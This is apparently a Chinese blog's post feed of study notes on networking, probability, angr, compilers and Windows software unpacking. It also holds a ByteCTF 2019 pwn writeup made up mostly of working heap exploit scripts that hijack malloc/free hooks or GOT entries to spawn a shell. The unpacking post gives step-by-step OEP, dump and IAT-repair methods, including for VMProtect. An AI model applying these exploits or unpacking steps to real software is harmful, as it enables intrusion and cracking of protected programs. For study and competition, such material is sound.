ADSL2(G.992.3和G.992.4)和ADSL2+(G.992.5)通过提高调制效率得到更高的数据率.ADSL2要求至少支持下行8Mbit/s,上行800kbit/s的速率.ADSL2+则将频谱范围从1.1MHz扩展至2.2MHz,下行速率可达16Mbit/s(最大传输速率可达25Mbit/s),而上行速率可达800kbit/s. 采用无缝速率自适应技术SRA可在运营中不中断通信和不产生误码的情况下,自适应调整数据率.改善了线路质量评测和故障定位功能,这对提高网络的运行维护水平具有非常重要的意义. 光纤同轴混合网HFC 光纤同轴混合网HFC网是在目前覆盖面很广的有线电视网CATV的基础上开发的一种居民宽带接入网.HFC网除可传送CATV外,还提供电话,数据和其他宽带交互型业务. 现有的CATV网是树形拓扑结构的同轴电缆网络,它采用模拟技术的频分复用对电视节目进行单向传输,HFC网对CATV网进行了双向通信的改造. HFC网将原CATV网中的同轴电缆主干部分改换为光纤并使用模拟光纤技术,在模拟光纤中采用光的振幅调制AM,比使用数字光纤更为经济. 用户接口盒 用户接口盒UIB提供三种连接. 使用同轴电缆连接到机顶盒,然后再连接到用户的电视机. 使用双绞线连接到用户的电话机. 使用电缆调制解调器连接到用户的计算机. 电缆调制解调器是为HFC网而使用的调制解调器,电缆调制解调器最大的特点就是传输速率高.电缆调制解调器比在普通电话线上使用的调制解调器要复杂得多,并且只安装在用户端。]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-bytectf-2019-quals-pwn]]></title>
    <url>%2Fposts%2F39083382%2F</url>
    <content type="text"><![CDATA[mulnote Ollvm混淆,漏洞在free的时候,thread中sleep了10秒导致UAF. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *def add(size, content): r.sendlineafter("&gt;", "C") r.sendlineafter("size&gt;", str(size)) r.sendafter("note&gt;", content)def show(): r.sendlineafter("&gt;", "S")def dele(index): r.sendlineafter("&gt;", "R") r.sendlineafter("index&gt;", str(index))def edit(index, content): r.sendlineafter("&gt;", "E") r.sendlineafter("index&gt;", str(index)) r.sendafter("note&gt;", content)libc = ELF("./libc.so", checksec = False)# elf = ELF("./mulnote", checksec = False)r = process("./mulnote")add(0x68,"A")add(0x68,"A")add(0x100,"A")add(0x10,"A")dele(0)dele(1)dele(2)add(0x68,"A")show()r.recvuntil("1]:\n")heap = u64(r.recv(6).ljust(8, '\x00')) - 0x41r.recvuntil("2]:\n")libc.address = u64(r.recv(6).ljust(8, '\x00')) - 0x3c4b78add(0x68,"A")dele(4)dele(0)edit(0, p64(libc.symbols["__malloc_hook"] - 0x23))add(0x68, "A")add(0x68, "\x00" * 0x13 + p64(libc.address + 0x4526a))sleep(15)r.sendlineafter('&gt;', 'C')r.sendlineafter('size&gt;', str(0x20))#gdb.attach(r)print "libc: " + hex(libc.address)print "heap: " + hex(heap)r.interactive() mheap 程序定义了自己的chunk. 12345struct chunk &#123; size_t size; struct chunk * next; char buf[size];&#125; 由于使用的是mmap的地址,大量申请内存使read读取数据时触发缺页异常导致read返回-1,从而向前写已free的chunk的next指针. 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *def add(index, size, content): r.sendlineafter("Your choice: ", "1") r.sendlineafter("Index: ", str(index)) r.sendlineafter("Input size: ", str(size)) r.sendafter("Content: ", content)def show(index): r.sendlineafter("Your choice: ", "2") r.sendlineafter("Index: ", str(index))def dele(index): r.sendlineafter("Your choice: ", "3") r.sendlineafter("Index: ", str(index))def edit(index, content): r.sendlineafter("Your choice: ", "4") r.sendlineafter("Index: ", str(index)) r.send(content)libc = ELF("./libc-2.27.so", checksec = False)elf = ELF("./mheap", checksec = False)r = process("./mheap")add(0, 0xfb0, "A" * 0x10 + "\n")add(0, 0x10, "A" * 0x10)dele(0)add(1, 0x60, p64(0x00000000004040d0) + 'A' * 0x2f + "\n")add(0, 0x23330fb0, "A" * 0x8 + p64(elf.got["atoi"]) * 2 + "\n")show(1)libc.address = u64(r.recv(6).ljust(8,'\x00')) - libc.symbols["atoi"]edit(1, p64(libc.symbols["system"]) + "\n")r.sendlineafter("Your choice: ", "/bin/sh\x00")print "libc : " + hex(libc.address)r.interactive() vip edit存在堆溢出,但是输入会被/dev/urandom数据覆写. vip函数中存在溢出,可以覆写sock_filter,将open("/dev/random", 0)的返回值改为ERRNO(0)从而使fd = 0. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *def alloc(index): r.sendlineafter("choice: ", "1") r.sendlineafter("Index: ", str(index))def show(index): r.sendlineafter("choice: ", "2") r.sendlineafter("Index: ", str(index))def dele(index): r.sendlineafter("choice: ", "3") r.sendlineafter("Index: ", str(index))def edit(index, size, content): r.sendlineafter("choice: ", "4") r.sendlineafter("Index: ", str(index)) r.sendlineafter("Size: ", str(size)) r.sendafter("Content: ", content)def become_vip(name): r.sendlineafter("choice: ", "6") r.sendafter("name: ", name)elf = ELF('./vip')libc = ELF('./libc-2.27.so')r = process("./vip")payload = "a" * 0x20 + "\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f"become_vip(payload)for x in range(4): alloc(x)dele(1)edit(0, 0x68, "A" * 0x50 + p64(0) + p64(0x61) + p64(0x404100))alloc(1)alloc(0xf)edit(0xf, 8, p64(elf.got['free']))show(0)libc.address = u64(r.recvline(keepends = False).ljust(8, '\x00')) - libc.sym['free']edit(0xf, 0x10, p64(libc.sym['__free_hook']) + p64(libc.search('/bin/sh').next()))edit(0, 8, p64(libc.sym['system']))dele(1)print "libc : " + hex(libc.address)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-probability-theory-基本概念]]></title>
    <url>%2Fposts%2F4d9abdd4%2F</url>
    <content type="text"><![CDATA[概论 概率论是研究如何定量描述随机现象及其规律的一门学科. 随机现象:在个别试验中其结果呈现出不确定性,在大量重复试验中结果具有统计规律性. 随机实验 随机试验:可在相同的条件下重复进行;每次试验的结果不止一个,且能事先明确所有可能的结果;一次试验前不能确定会出现哪个结果. 实际推断原理:小概率事件在一次试验中实际上是不可能发生的.同时,在大量重复实验中小概率事件的发生是必然的. 样本空间 样本空间(集合论):随机试验\(E\)的所有可能结果组成的集合称为\(E\)的样本空间,记为\(S\).样本空间的元素称为样本点,用\(e\)表示. 样本空间的分类:离散样本空间,样本点为有限多个或可列多个;无穷样本空间,样本点在区间或区域内取值. 随机事件(元素) 随机事件:样本空间\(S\)的子集称为随机事件,简称事件.在一次试验中,当且仅当这一子集中的一个样本点出现时,称这一事件发生. 基本事件:由一个样本点组成的单点集. 复合事件:由两个或两个以上的基本事件复合而成的事件为复合事件. 样本空间\(S\)是自身的子集,在每次试验中总是发生的,称为必然事件. 空集\(\emptyset\)不包含任何样本点,它在每次试验中都不发生,称为不可能事件. 事件间的关系与运算 集合间的关系与运算对应事件之间的包含,相等关系,和事件(并),积事件(交)和差事件. 如果事件\(A\),\(B\)交集为空集,则\(A\),\(B\)互不相容(互斥).基本事件是两两互不相容的,即样本点是互不相容的. 对于互不相容的事件\(A\)与\(B\),称它们的并为和,记作\(A + B\). 对立事件(逆事件):若\(A\),\(B\)互斥,同时\(A + B = S\).则称\(A\),\(B\)为对立事件(逆事件).\(A\)的对立事件即\(\overline{A}\). 事件运算满足集合的运算律:交换律,结合律,分配律,对偶律(德摩根律). 频率与概率 频率 频率:在相同条件下,进行了\(n\)次试验,事件\(A\)发生的次数\(n_A\),称为\(A\)的频数,\(n_A/n\)称为事件\(A\)发生的频率,记为\(f_n(A)\). 频率的基本性质:非负性(\(1 \ge f_n(A) \ge 0\)),规范性(\(f_n(S) = 1\)),有限可加性(对于有限个两两互不相容的事件,其和事件的频率为各事件频率之和). 频率的特性:波动性和稳定性.实现次数少时体现较强的波动性,实现次数多时体现较强的稳定性. 概率 概率的统计性定义:当试验的次数增加时,随机事件\(A\)发生的频率的稳定值\(p\)称为概率,记为\(P(A) = p\). 概率的公理化定义:设\(S\)是样本空间,\(E\)是随机试验.对于\(E\)的每个事件\(A\)对应一个实数\(P(A)\),称为事件\(A\)的概率,其中集合函数\(P(.)\). 概率的基本性质:非负性(\(1 \ge P(A) \ge 0\)),规范性(\(P(S) = 1\)),有限可加性(对于有限个两两互不相容的事件,其和事件的概率为各事件概率之和). 概率的性质. \(P(\emptyset) = 0\); 对立事件概率之和为一; 对于互有包含关系的事件,若\(B\)包含\(A\),\(P(B - A) = P(B) - P(A)\),同时\(P(B) &gt; P(A)\). 任意两事件\(A\),\(B\),\(P(A \cup B) = P(A) + P(B) - P(AB)\)(所以互斥事件存在有限可加性). 任意多个事件的和事件的概率计算公式. \(P(A_1 \cup A_2 \cup ... \cup A_n) = \sum_{i=1}^n P(A_i) - \sum_{1 \le i &lt; j \le n} P(A_iA_j) + \sum_{1 \le i &lt; j &lt; k \le n} P(A_iA_jA_k) + ... + (-1)^{n-1}P(A_1A_2...A_n)\). 等可能概型(古典概型) 等可能概型的两个特点:样本空间中的元素只有有限个;试验中每个基本事件发生的可能性相同. 概率的古典概型定义:对于古典概型,样本空间\(S = \{x_1, x_2, ..., x_n\}\),设事件\(A\)包含\(S\)的\(k\)个样本点,则事件\(A\)的概率定义为:\(P(A) = k / n\). 古典概型两大原理. 加法原理:完成一件工作,有\(m\)类方法,而第\(1\)类方法有\(n_1\)种方法,第\(2\)类方法有\(n_2\)种方法,...,第\(m\)类方法有\(n_m\)种方法,任选一种此工作就完成,那么完成这项工作共有\(N = n_1 + n_2 + ... + n_m\)种不同的方法. 乘法原理:完成一件工作,需要\(m\)个步骤,而第\(1\)步有\(n_1\)种方法,...,第\(m\)步有\(n_m\)种方法,依次完成这\(m\)步时这项工作才完成,那么完成这项工作共有\(N = n_1 * n_2 * ... * n_m\)种不同的方法. 古典概型两大取法. 每次取完后放回,不改变样本空间. 每次取完后不放回,改变样本空间. 古典概型两大放法. 排列:\(n\)个不同元素中取出\(m\)个无重复元素,排成一列(有顺序关系). 组合:\(n\)个不同元素中取出\(m\)个无重复元素,不排列(没有顺序关系). 排列:\(A^m_n = \frac{n!}{(n-m)!}\). 组合:\(C^m_n = \frac{n!}{m!(n-m)!}\). 常用计算方法:对立事件概率和为\(1\);概率的有限可加性;任意多个事件的和事件的概率计算公式. 条件概率 设试验\(E\)的样本空间为\(S\).\(A\),\(B\)是事件,要考虑在\(A\)已经发生的条件下\(B\)发生的概率,这就是条件概率问题. 设\(A\),\(B\)是两个事件,\(P(A) &gt; 0\),称\(P(B|A) = \frac{P(AB)}{P(A)}\)为事件A发生的条件下事件\(B\)发生的条件概率. 条件概率符合概率的三个基本性质.此外,条件概率具有无条件概率类似性质.当\(A = S\)时,\(P(B|S) = P(B)\),条件概率化为无条件概率. 计算条件概率有两种方法: 1. 公式法,直接带入公式求值; 2. 缩减样本空间法,在\(A\)发生的前提下确定\(B\)的缩减样本空间,并在其中计算\(B\)发生的概率,从而得到\(P(B|A)\). 由条件概率定义推广可得乘法定理. \(P(A) &gt; 0\),\(P(AB) = P(A)P(B|A)\). \(P(AB) &gt; 0\),\(P(ABC) = P(A)P(B|A)P(C|AB)\). \(P(A_1A_2...A_{n-1}) &gt; 0\),\(P(A_1A_2...A_n) = P(A_1)P(A_2|A_1)...P(A_{n-1}|A_1A_2...A_{n-2})P(A_{n}|A_1A_2...A_{n-1})\). 全概率公式和贝叶斯公式 样本空间的划分(集合的划分). 若事件\(B_1\),...,\(B_n\)满足: \(B_iB_j = \emptyset\),\(i \neq j\),\(i,j = 1,2,...,n\). \(\bigcup^{n}_{i=1}B_i = S\). 则称\(B_1\),...,\(B_n\)是样本空间\(S\)的一个划分. 若\(B_1\),...,\(B_n\)是样本空间\(S\)的一个划分,则每次试验中,事件\(B_1\),...,\(B_n\)中必有一个且仅有一个发生.特别当\(n = 2\)时\(B_1\)与\(B_2\)互为对立事件. 全概率公式可以将一个复杂的事件\(A\)的概率通过一组划分变为若干个简单事件概率之和的形式. 若\(B_1\),...,\(B_n\)是样本空间\(S\)的一个划分,\(P(B_i) &gt; 0(i = 1,2,...,n)\),\(A\)为\(E\)的事件,则\(P(A) = \sum^n_{i=1}P(B_i)P(A|B_i)\)称为全概率公式. 若某事件是伴随着一个完备事件组的发生而发生,则马上联想到事件发生的概率用全概率公式计算. 贝叶斯公式(逆概公式)用于追查是何种原因(或情况,条件)下引发的概率. 若\(B_1\),...,\(B_n\)是样本空间\(S\)的一个划分,且\(P(B_i) &gt; 0\),\(A\)是一个随机事件且\(P(A) &gt; 0\). \(P(B_i|A) = \frac{P(B_i)P(A|B_i)}{\sum^n_{j=1}P(B_j)P(A|B_j)},i = 1,2,...,n\). 独立性 当\(A\)的发生对\(B\)的发生的概率没有影响时,有\(P(B|A) = P(B)\),由乘法公式有\(P(AB) = P(A)P(B|A) = P(A)P(B)\). 定义:设\(A\),\(B\)是两事件,如果满足等式\(P(AB) = P(A)P(B)\),则称事件\(A\)与事件\(B\)是相互独立的事件. 零概率事件与任何事件都是相互独立的. 由对称性:\(A\),\(B\)相互独立,必有\(B\),\(A\)相互独立. 定义推广:设事件\(A_1\),\(A_2\),...,\(A_n\)对任意的\(1 \le i &lt; j \le n\)有\(P(A_iA_j) = P(A_i)P(A_j)\),则称这\(n\)个事件两两相互独立.如果对于任意的\(k\)(\(k \le n\)),任意的\(1 \le i_1 &lt; i_2 &lt; ... &lt; i_k \le n\)都有:\(P(A_{i1}A_{i2}...A_{ik}) = P(A_{i1})P(A_{i2})...P(A_{ik})\),则称这\(n\)个事件相互独立. 若\(n\)个事件相互独立,必蕴含这\(n\)个事件两两相互独立,反之不真. 定理:设\(A\),\(B\)是两事件,且\(P(A) &gt; 0\),则\(A\),\(B\)相互独立的充要条件是:\(P(B|A) = P(B)\). 结论一:若\(A\),\(B\)相互独立,则\(A\)与非\(B\),非\(A\)与\(B\),非\(B\)与非\(A\)也相互独立. 结论二:若\(P(A) &gt; 0\),\(P(B) &gt; 0\),则\(A\),\(B\)相互独立与\(A\),\(B\)互不相容不能同时成立. 利用独立性计算古典概率 计算相互独立的积事件的概率:若已知\(n\)个事件\(A_1\),\(A_2\),...,\(A_n\)相互独立,则\(P(A_1A_2...A_n) = P(A_1)P(A_2)...P(A_n)\). 计算相互独立事件的和的概率:若已知\(n\)个事件\(A_1\),\(A_2\),...,\(A_n\)相互独立,则\(P(A_1UA_2U...UA_n) = 1 - P(\overline{A_1}\overline{A_2}...\overline{A_n})\).]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>probability-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-angr-基础]]></title>
    <url>%2Fposts%2F318f3199%2F</url>
    <content type="text"><![CDATA[概览 angr是一个利用python开发的二进制程序分析框架,具有对二进制文件执行动态符号执行和各种静态分析的功能. 符号执行是在运行程序时用符号来替代真实值,由于符号是可变的,可以尽可能的将程序的每一条路径遍历,这样的话,必定存在至少一条能够输出正确结果的分支,每一条分支的结果都可以表示为一个离散关系式,使用约束求解引擎即可分析出正确结果,这就是符号执行的简单阐述. 符号执行的路径选择问题到现在依旧是一个很大的问题,当程序存在循环时,每次循环之后会形成至少两个分支,当循环的次数足够多时,就会造成路径爆炸. angr分析程序流程. 导入二进制文件. 建立状态. 定义符号变量并与二进制文件相联系. 建立simgr管理state. 通过active的变化来筛选. 获取目标状态的数值. 状态 在angr寻找路径时,程序的当前状态有多种表示. 123456step()#向下执行一个block,产生active状态,表示该分支在执行中.run()#运行到结束,产生deadended状态,表示分支结束.explore()#对地址进行限制筛选路径,例如:sm.explore(find = [0x400676], avoid = [0x40073d]).产生found状态,表示探索的结果等等. 约束求解 123456print sm.found.solver.eval(arg1, cast_to = str)#使用约束求解引擎获取命令行参数inp = sm.found.posix.files[0].all_bytes() print sm.found.solver.eval(inp, cast_to = str)#使用约束求解引擎获取标准输入 简单使用 123456789101112131415161718192021import angrimport sysdef main(argv): project = angr.Project(argv[1]) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) print_good_address = 0x232323 simulation.explore(find = print_good_address) if simulation.found: solution_state = simulation.found[0] #获取一个筛选出来的状态 print solution_state.posix.dumps(sys.stdin.fileno()) #打印该状态的标准输入 else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv)]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-Windows-加壳与脱壳]]></title>
    <url>%2Fposts%2F2240e62b%2F</url>
    <content type="text"><![CDATA[壳 从技术的角度出发,壳是一段执行于原始程序前的代码,原始程序的代码在加壳的过程中可能被压缩,加密等,当加壳后的文件执行时,壳把压缩加密后的代码还原成原始程序代码,然后再把执行权交还给原始代码. 软件的壳分为加密,压缩壳等类,都会隐藏程序真正的OEP或者用假的OEP(Original Entry Point,程序的入口点)防止被破解. 加壳 加壳过的可执行文件依旧是可执行文件,它可以同正常的可执行文件一样执行.用户执行的实际上是外壳程序,这个外壳程序负责把用户原来的程序在内存中解压缩,并把控制权交还给解开后的真正程序,这一切工作都是在内存中运行的,整个过程对用户是透明的. 壳修改了原程序的执行文件的组织结构,从而能够比原程序的代码提前获得控制权,并且不会影响原程序的正常运行. 壳一般都修改了原程序文件的输入表,加壳后的输入表一般所引入的DLL和API函数都很少;壳出于保护原程序代码和数据的目的,一般都会加密原程序文件的各个区块;各类加壳软件,其压缩算法一般不是自己实现的,大多是调用其他的压缩引擎. 壳装载 壳装载的一般过程. 保护入口参数,pushad/pushfd. 用显式链接方式动态加载壳所需要使用的API地址,3个相关的重要函数:GetModuleHandle(返回指定模块的句柄),GetProcAddress(返回指定函数地址),LoadLibrary(加载动态链接库). 对原程序文件的各个区块数据解密,并把解密的区块数据按照区块的定义放在合适的内存位置,以让程序能正常运行.如果加壳时用到了压缩技术,那么在解密之前还有解压缩. IAT的初始化,重定位项的处理,DLL文件脱壳,HOOK API. 跳转到程序原入口点OEP. 壳自校检 壳自检验大致分为以下几个类型. 调用CreatFileA(W)函数加载自身,然后通过GetFileSize获取文件大小比较来检测是否被脱壳.调用SetFilePointer设置文件指针,通过ReadFile读取文件中的一些数据,来判断是否被脱壳. 对程序在内存中镜像进行CRC,MD5等检验,如果不相等则认为已脱壳或被修改.用PEID插件可以查看算法的所在位置,就可以到达解密点了. 脚本编程语言(如autoit,autohotkey)等语言编译出来的程序一般都是天生带壳的,而且自校验是对附加数据进行多次细致的检查,如果不弄清楚检验过程,即使更改跳转也不能让程序正常运行. 在主程序中插入一些跳到壳地址中的代码,并返回一些无关紧要的数据或做无关紧要的操作.如果程序被脱壳了,这些代码执行的时候就会出现异常.出现异常后,在堆栈中找到返回的位置,nop掉相应的指令即可. 常见壳 加壳软件按照其加壳目的和作用,可分为压缩壳,加密壳,虚拟机保护壳. 压缩壳主要目的是减小程序体积,如ASPacK,UPX和PECompact等;加密壳主要目的是保护程序,用上了各种反跟踪技术保护程序不被调试,脱壳等,如ASProtect,Armadillo,EXECryptor等.虚拟机保护壳实现了一个软件版的CPU,被加密的可执行代码已经不再遵守Intel制定的OPCode标准了,而是执行由虚拟机作者本身制定的非公开的,动态的CPU指令编码解码标准,通常称之为TextCode. http://www.aspack.com/:ASPack可压缩Win32可执行文件以及库文件,文件压缩比率高达40% ~ 70%. http://upx.sourceforge.net/:UPX是一个以命令行方式操作的可执行文件经典免费压缩程序,开源. http://www.bitsum.com/:PECompact提供了多种压缩项目的选择,用户可以根据需要确定哪些内部资源需要压缩处理.同时,该软件还提供了加解密的插件接口功能. http://www.aspack.com/:ASProtect. http://www.ultraprotect.com/:ACProtect. http://www.siliconrealms.com:Armadillo. http://www.strongbit.com/:EXECryptor. http://www.obsidium.de/:Obsidium. http://pespin.w.interia.pl/:PESpin. http://www.polytech.ural.ru/:虚拟机保护软件VMProtect,将程序代码转换成字节码,然后跳转到虚拟机解释执行. http://www.oreans.com/xprotector/:Xtreme-Protector. http://www.oreans.com:Themida/WinLicense. 常见脱壳工具 文件分析工具:PEiD,ExeinfoPe. OEP入口查找工具:Ollydbg,PEiD,ExeinfoPe. dump工具:PEditor,Procdump,LordPE. PE文件编辑工具:PEditor,Procdump,LordPE. 重建Import Table工具,输入表重建工具:ImportREConstructor. ASProtect脱壳专用工具:Caspr(ASPr V1.1-V1.2有效),Rad(ASPr V1.1有效),LordPE,PEiD. 调试器:Ollydbg. 内存抓取工具:Procdump,LordPE. PE编辑工具:Procdump,PEditor. 脱壳 脱壳主要有两种方法:硬脱壳和动态脱壳. 硬脱壳指找出加壳软件的加壳算法,然后写出对应的脱壳算法或者使用对应的脱壳工具,就像压缩和解压缩一样,一般压缩壳都有专用的脱壳机,而加密壳很少有. 动态脱壳的一般流程是:查壳-&gt;寻找OEP-&gt;Dump-&gt;重建PE文件. 首先用相关工具分析一下是什么壳,然后跟踪分析.脱壳过程中可以通过查看资源类型来大致判断源程序语言类型. 一般加壳程序在使用Ollydbg等动态调试工具时,会停在壳的预处理块.即处在对于程序原始代码块的解压或解密操作之前,在运行完程序自脱壳模块后,会停留在程序加壳之前的OEP位置,此时是dump程序的最佳时期.脱壳时在真实OEP处下int3断点,就可以捕捉到程序代码段完全恢复的状态. 所以脱壳首先要确定OEP(原始入口点),决大多数PE加壳程序在被加密的程序中加上一个或多个段,所以跨段转移或跳转就有可能是跳往OEP. 然后Dump内存中已经还原的文件,使用内存抓取工具即可.对于用Procdump之类的FULL DUMP功能脱壳的文件,要用Procdump或PEditor之类的PE编辑工具修正入口点. 然后就是修复IAT(Import Address Table,导入地址表),当PE文件被装入内存的时候,Windows装载器才将DLL装入,并将调用导入函数的指令和函数实际所处的地址联系起,这操作就需要导入表完成.其中导入地址表就指示函数实际地址,多数加壳软件在运行时会重建导入地址表,因此获取加壳程序正确的导入地址表也是手动脱壳操作中的一个关键问题. 使用Import REConstructor修复IAT表. 运行Import REConstructor和需要脱壳的应用程序,选择应用程序进程并填上OEP,点击IAT AutoSearch,出现Get Import按钮则表示输入的OEP发挥作用. 然后点击Get Import,让其分析IAT结构得到基本信息. 如果某个DLL显示valid :NO,点击Show Invalids分析所有的无效信息,在Imported Function Found栏中右键选择Trace Level1 (Disasm). 再次点击Show Invalids,如果成功,可以看到所有的DLL都为valid:YES.如仍有无效的地址,继续手动用右键的Level 2或Level 3修复. 如果还是出错,可以利用Invalidate function(s),Delete thunk(s),编辑Import表(双击函数)等功能手动修复. 之后开始修复已脱壳的程序,选择Add new section来为Dump出来的文件加一个Section. 点击Fix Dump,并选择Dump出来的文件,此时OEP也被修正.生成的文件可以跨平台运行. 单步跟踪法 通过Ollydbg的单步步过(F8),单步进入(F7)和运行到(F4)功能,完整走过程序的自脱壳过程,跳过一些循环恢复代码的片段,并用单步进入确保程序不会越过OEP,这样可以在软件自动脱壳模块运行完毕后,到达OEP,并dump程序. 一般先f8单步步过,遇见向上的就f4跳到下一条语句,一般有很大的跳转(跨段)就可能会到程序的OEP. ESP定律法 ESP定律的原理在于程序中堆栈平衡的合理利用.由于在程序自解密或者自解压过程中,不少壳会先将当前寄存器内容压栈,如使用pushad,在解压结束后,会将之前的寄存器值出栈,如使用popad.因此在寄存器出栈时,往往程序代码被自动恢复,此时硬件断点触发.然后在程序当前位置,只需要少许单步跟踪,就很容易到达正确的OEP位置. 示例:将upx壳程序拖入Ollydbg后,F8,同时注意右面寄存器FPU的显示,当pushad结束后,就可以右键ESP选择在数据窗口跟随,在下面的内存数据窗口与堆栈窗口都会转移到该地址的位置,随后右键该地址中数值设置断点-&gt;硬件访问-&gt;word型. 随后F9,此时程序会暂停在断点位置.F8到jnz位置后不要再按F8,用鼠标点击下一行然后按F4,让程序强制转到跳转下面继续运行,到达jmp发现目标地址就是程序的OEP.右键使用OllyDump脱壳调试程序即可. 内存镜像法(二次断点法) 内存镜像法是在加壳程序被加载时,通过Ollydbg的ALT + M快捷键进入到程序虚拟内存区段.然后通过加两次内存一次性断点,到达程序正确OEP的位置. 内存镜像法的原理在于对于程序资源段和代码段下断点,一般程序自解压或者自解密时,会首先访问资源段获取所需资源(此时代码段一般已经解密),然后在自动脱壳完成后,转回程序代码段.这时候下内存一次性断点,程序就会停在OEP处. 一步到达OEP 根据所脱壳的特征,寻找其距离OEP最近的一处汇编指令,然后下int3断点,在程序走到OEP的时候dump程序. 如一些压缩壳往往popad指令距离OEP或者Magic Jump特别近,因此使用Ollydbg的搜索功能,可以搜索壳的特征汇编代码,达到一步断点到达OEP的效果. 最后一次异常法 最后一次异常法的原理是,程序在自解压或自解密过程中,可能会触发无数次的异常.如果能定位到最后一次程序异常的位置,可能就会很接近自动脱壳完成位置. 现在最后一次异常法脱壳可以利用Ollydbg的异常计数器插件,先记录异常数目,然后重新载入,自动停在最后一次异常处. 根据编译语言特点寻找OEP 比如在VC6的启动部分有GetCommandLineA(W),GetVersion函数等,可以对GetVersion函数设置断点,中断两次后,就可以回到OEP附近. SFX法 SFX法利用了Ollydbg自带的OEP寻找功能,可以选择直接让程序停在Ollydbg找到的OEP处,此时自解压已经完成,可以直接dump程序. vmprotect脱壳 用exeinfo PE查壳. 设置Ollydbg:选项-&gt;调试设置-&gt;事件-&gt;系统断点. 将程序载入Ollydbg,f9运行,便会来到一个call,ctrl + g搜索VirtualProtect. 接着便会来到一个地址,在这里下断点,继续f9. 然后运行几次f9都会断到这里,NewProtect = READONLY且最后一次时alt + B,断点界面取消或禁用断点,然后alt + M,对text段下内存访问断点. ctrl + g搜索401000,硬件访问断点.运行,接着可以搜索特征码:EB0B85F375078BC6C1E0100BF0. 此时就找到OEP了,直接dump出来IDA分析,IAT修复后运行.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-compiler-principles-词法分析]]></title>
    <url>%2Fposts%2F16b2bf6c%2F</url>
    <content type="text"><![CDATA[词法分析概览 词法分析的任务:从左到右逐个字符地对源程序进行扫描,产生一个个的单词符号,把作为字符串的源程序改造成为由单词符号组成的中间程序. 单词符号一般包括的种类:关键字/基本字,标识符,常数,运算符,界符(分隔符). 词法分析器输出单词符号的形式:(单词种别,单词符号的属性值). 单词种别通常用整数编码,提供给语法分析程序使用;单词自身的属性值提供给语义分析程序使用. 若一个单词种别只有一个单词符号,则种别编码就代表该单词符号,例如:运算符,界符(分隔符),基本字. 词法分析器的设计 单词最大长度的就是编程语言中要求的标识符最大长度,其值为扫描缓冲区总长度的一半. 状态转换图 状态转换图是一张有限方向图,可用于识别或接受一定的字符串. 在状态转换图中,结点代表状态,用圆圈表示. 状态之间用箭弧连结,箭弧上的标记(字符,正规式)代表在射出结点状态下可能出现的输入字符或字符类. 一张状态转换图只包含有限个状态(即有限个结点),其中含有一个初态(用双线箭头指示)和一个或以上个终态(用双圈表示). 初态表示分析的开始,终态表示分析的结束. 从状态转换图来看,如果存在一条从初态结点到某一终态结点的通路,且这条通路上所有弧的标记符连接成的字等于α,则称α被该状态转换图识别(接受). 状态转化图的实现 正规集与正规式(正规表达式) 正规集可以用正规式表示,正规式是表示正规集一种方法.一个字集合是正规集当且仅当它能用正规式表示. 程序语言定义的合法单词的集合就是正规集,用正规式作为正规集的代表或者说命名. 确定有限自动机 确定有限自动机(DFA)的三种表示形式:形式化定义;状态转换矩阵;状态转换图. 以下述方式递归扩张f的定义:f(s,ε) = s,f(s,aα) = f(f(s,a),α)(a属于Σ,s属于S). 对于Σ*上的任何字α,如果存在一条从初态结点到某一终态结点的通路,且这条通路上所有弧的标记符连接成的字等于α,则称α可为DFA M所识别(读出或接受). 如果M的初态结点同时又是终态结点,则空字ε可为DFA M所识别. DFA M所能识别的字的全体记为L(M). 非确定有限自动机 对于Σ*中的任何一个字α,若存在一条从某一初态结点到某一终态结点的通路,且这条通路上所有弧的标记字依序连接成的字(忽略那些标记为ε的弧)等于α,则称α可为NFA M所识别(读出或接受). 若M的某些结点既是初态结点又是终态结点,或者存在一条从初态结点到某一终态结点的ε通路,那么空字ε可为M所接受. NFA M所能识别的字的全体记为L(M). DFA和NFA的等价性 由于NFA更容易由自然语言描述的语法获得,所以可以先给出NFA,然后转化为DFA,再由程序实现. 等价性通过NFA向DFA的转化算法来证明(因为DFA是NFA特例,又NFA都能转化为DFA,所以对于任意NFA,总是存在一个DFA与之等价). 基于状态转化图的改造 这一步解决了初始状态唯一性的问题,同时简化了弧上的标记. NFA确定化--子集法 设I是有限自动机的状态集的子集,I的ε闭包ε_CLOSURE(I)定义如下. 如果状态q属于I,则q属于ε_CLOSURE(I)(即I中的状态全部属于ε_CLOSURE(I)). 如果状态q属于I,那么从状态q出发经过任意ε弧而能到达的任何状态q′都属于ε_CLOSURE(I)(可以连续经过多条ε弧). 假定I是非确定有限自动机的状态集的子集,则定义Ia = ε_CLOSURE(J),其中a属于Σ,J是从I中的某一状态结点出发经过一条a弧和任意ε弧而达到的状态结点的全体. 确定化:假设Σ = {a1, a2, a3, ..., ak},构造状态转化表,表的构成. 每一行包含k + 1列,首行首列为ε_CLOSURE(X). 如果每行的第一列假定为I,则该行的i + 1列为Iai.然后检查该行的所有状态子集,将未曾在第一列出现的填入到后面空行的第一列. 重复第2步,直到出现在表的第i + 1列上的所有状态子集均在第一列中出现. 这一步解决了ε弧和转换关系. 将构造出来的表视为状态转换矩阵,将其中的每个状态子集视为新的状态. 显然该表唯一的刻画了一个DFA 